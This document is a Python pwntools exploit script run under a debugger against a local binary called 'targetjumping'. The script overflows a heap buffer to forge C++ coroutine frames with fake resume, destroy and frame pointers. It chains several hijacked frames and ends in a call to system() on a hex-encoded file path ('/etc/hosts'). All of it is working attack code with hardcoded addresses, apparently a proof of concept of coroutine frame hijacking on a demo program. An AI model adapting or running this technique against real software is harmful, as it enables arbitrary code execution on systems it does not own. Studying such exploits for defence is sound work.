from pwn import *

context.update(arch='x86_64', os='linux')
binary = ELF('./targetjumping')
context.binary = binary
#context.terminal = ['bash', '-e']
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

p = gdb.debug('./targetjumping', '''
    b main
    b resume
    c        
''')

CORO_RESUME_CODE_PTR = 0x0000555555557692
CORO_DESTROY_CODE_PTR = 0x0000555555557d7e
PROMISE_PTR = 0x000055555556fef0
PROMISE_VALUE = 0x696600524f525245
SELF_FRAME_PTR = 0x000055555556fed0
VARS_PARAMS_RESUME_INDEX = 0x0000000001010006
VARS_PARAMS_RESUME_INDEX_RESETCORO = 0x0000000001010000
CORO_PARAM_PTR = 0x000055555556ff18
STACK_FN_CORO_HANDLER_STRPTR_ORIGINAL = 0x000055555556ff18
STACK_FN_CORO_HANDLER_STRPTR_HIJACKED = 0x7fffffffdf80
STRING_BUF_ADDR = 0x000055555556cf10 #0x000055555556d860
SYSTEM_PLT = 0x555555557320
HIJACKED_FILENAME_ADDR = 0x555555570598
HIJACKED_FILENAME_NAME_1 = 0x736F682F6374652F 
HIJACKED_FILENAME_NAME_2 = 0x7374
SYSTEM_CALL_PTR = 0x555555557320
SYSTEM_CALL_ARG1 = 0xa

SECOND_GADGET_FRAME_START = 0x555555570250
THIRD_GADGET_FRAME_START = 0x555555570550
FOURTH_GADGET_FRAME_START = 0x555555570850

p.recvuntil("Reading user input from coroutine (one line)\n")
p.sendline("012345678901234567890123456789")

p.recvuntil("Reading user input into insecure buffer (10 bytes)\n")
#Overflowing the heap
heap_payload_1 = b'A'*32
heap_payload_2 = pack(CORO_RESUME_CODE_PTR) + pack(CORO_DESTROY_CODE_PTR) + \
    pack(PROMISE_PTR) + p64(5) + p64(PROMISE_VALUE) + p64(0x656c) +pack(SELF_FRAME_PTR) + \
        pack(CORO_PARAM_PTR) + p64(0xa) + p64(0x69666d6f646e6172) + p64(0x656c) + \
        pack(VARS_PARAMS_RESUME_INDEX) + pack(STACK_FN_CORO_HANDLER_STRPTR_HIJACKED) + \
        p64(0x1e) + p64(0x1e) + p64(2) + pack(0x00007ffff7e21e20) + p64(0) +\
        pack(0x00007ffff7e21d28) + p64(0)*6 + pack(0x00007ffff7e2ada0) + p64(0)*17 +\
        pack(0x00007ffff7e2a730) + p64(0)*4 + pack(0x00007ffff7e21e48) + \
        p64(6) + p64(0) + p64(0x1002) + p64(4) + p64(0)*20 +\
        pack(0x0000555555570098) + pack(0x00007ffff7e2ada0) + p64(0)*2 +\
        pack(0x000055555556ff68) + pack(0x00007ffff7e2a7c0) +\
        pack(0x00007ffff7e2a750) + pack(0x00007ffff7e2a760) + p64(0)*11+\
        pack(0x00005555555701c0) + p64(5) + pack(0x000000524f525245) + p64(0)
        
heap_payload_3 = pack(CORO_RESUME_CODE_PTR) + pack(CORO_DESTROY_CODE_PTR) + \
    pack(PROMISE_PTR) + p64(5) + p64(PROMISE_VALUE) + p64(0) +pack(SECOND_GADGET_FRAME_START) + \
        pack(CORO_PARAM_PTR) + p64(0) + p64(0) + p64(0) + \
        pack(VARS_PARAMS_RESUME_INDEX) + pack(STACK_FN_CORO_HANDLER_STRPTR_HIJACKED) + \
        p64(0x0) + p64(0x1e) + p64(2) + p64(0) + pack(0x00007ffff7e21e20) + p64(0) +\
        pack(0x00007ffff7e21d28) + p64(0)*6 + pack(0x00007ffff7e2ada0) + p64(0)*17 +\
        pack(0x00007ffff7e2a730) + p64(0)*4 + pack(0x00007ffff7e21e48) + \
        p64(6) + p64(0) + p64(0x1002) + p64(4) + p64(0)*20 +\
        pack(0x0000555555570098) + pack(0x00007ffff7e2ada0) + p64(0)*2 +\
        pack(0x000055555556ff68) + pack(0x00007ffff7e2a7c0) +\
        pack(0x00007ffff7e2a750) + pack(0x00007ffff7e2a760) + p64(0)*10+\
        pack(0x555555570540) + p64(5) + pack(0x000000524f525245) + p64(0)

heap_payload_4 = pack(CORO_RESUME_CODE_PTR) + pack(CORO_DESTROY_CODE_PTR) + \
    pack(PROMISE_PTR) + p64(5) + p64(PROMISE_VALUE) + p64(0) +pack(THIRD_GADGET_FRAME_START) + \
        pack(HIJACKED_FILENAME_ADDR) + p64(0x1e) + p64(HIJACKED_FILENAME_NAME_1) + p64(HIJACKED_FILENAME_NAME_2) + \
        pack(VARS_PARAMS_RESUME_INDEX_RESETCORO) + pack(STACK_FN_CORO_HANDLER_STRPTR_HIJACKED) + \
        p64(0x0) + p64(0x1e) + p64(2) + p64(0) + pack(0x00007ffff7e21e20) + p64(0) +\
        pack(0x00007ffff7e21d28) + p64(0)*6 + pack(0x00007ffff7e2ada0) + p64(0)*11 +\
        p64(0) + p64(0) +\
        p64(0)*4 +\
        pack(0x00007ffff7e2a730) + p64(0)*4 + pack(0x00007ffff7e21e48) + \
        p64(6) + p64(0) + p64(0x1002) + p64(4) + p64(0)*20 +\
        pack(0x0000555555570098) + pack(0x00007ffff7e2ada0) + p64(0)*2 +\
        pack(0x000055555556ff68) + pack(0x00007ffff7e2a7c0) +\
        pack(0x00007ffff7e2a750) + pack(0x00007ffff7e2a760) + p64(0)*10+\
        pack(0x00005555555701c0) + p64(5) + pack(0x000000524f525245) + p64(0)

heap_payload = heap_payload_1 + \
    heap_payload_2 + b'B'*128 +\
    heap_payload_3 + heap_payload_4
p.send(heap_payload)

#output = p.recvline(timeout=3)
#print(output)

log.info("Payload length: "+ str(len(heap_payload)))

p.recvuntil("Reading user input from coroutine (one line)\n")
log.info("Overwriting frame handler to second frame")
p.sendline(pack(SECOND_GADGET_FRAME_START))

p.recvuntil("Reading user input from coroutine (one line)\n")
log.info("Overwriting frame handler to third frame")
p.sendline(pack(THIRD_GADGET_FRAME_START))

p.recvuntil("Reading user input from coroutine (one line)\n")
log.info("Executing hijacked frame with fake filename")
log.info("Also, overwriting frame handler for hijacked call to system()")
p.sendline(pack(FOURTH_GADGET_FRAME_START))



p.interactive()